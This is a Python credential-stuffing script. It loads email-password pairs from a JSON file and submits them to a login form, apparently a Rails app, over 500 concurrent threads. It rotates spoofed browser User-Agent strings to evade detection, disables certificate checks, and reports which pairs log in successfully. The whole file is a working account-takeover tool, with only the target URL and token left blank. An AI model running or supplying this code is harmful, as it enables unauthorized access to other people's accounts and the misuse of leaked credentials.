import requests
import json
import random
import concurrent.futures
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Load the JSON file with email-password pairs
with open('output.json') as f:
    credentials = json.load(f)

# URL and authenticity token
url = ''
authenticity_token = ''

# List of common User-Agent strings for different browsers
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1'
]

def try_login(credential):
    """Attempt login with the given email and password pair."""
    email = credential['email']
    password = credential['password']

    # Create the form data
    data = {
        'authenticity_token': authenticity_token,
        'user[email]': email,
        'user[password]': password,
        'commit': 'Log in'
    }

    # Choose a random User-Agent string from the list
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    try:
        # Send the POST request with headers
        response = requests.post(url, data=data, headers=headers, verify=False)

        # Check if the login was successful
        if "Signed in successfully" in response.text:
            print(f"Success! Email: {email}, Password: {password}")
            return True  # Indicate success
        else:
            print(f"Failed for Email: {email}, Password: {password}")
            return False  # Indicate failure
    except Exception as e:
        print(f"Error for Email: {email}, Password: {password}: {e}")
        return False

# Use ThreadPoolExecutor for multithreading
def main():
    # Define how many threads you want (you can adjust it based on your system)
    max_threads = 500

    with concurrent.futures.ThreadPoolExecutor(max_threads) as executor:
        # Map each credential to a thread
        future_to_credential = {executor.submit(try_login, credential): credential for credential in credentials['data']}

        # Process results as they are completed
        for future in concurrent.futures.as_completed(future_to_credential):
            result = future.result()
            if result:  # Stop further attempts if a success is found
                print("Stopping further requests due to success.")
                executor.shutdown(wait=False)
                break

if __name__ == "__main__":
    main()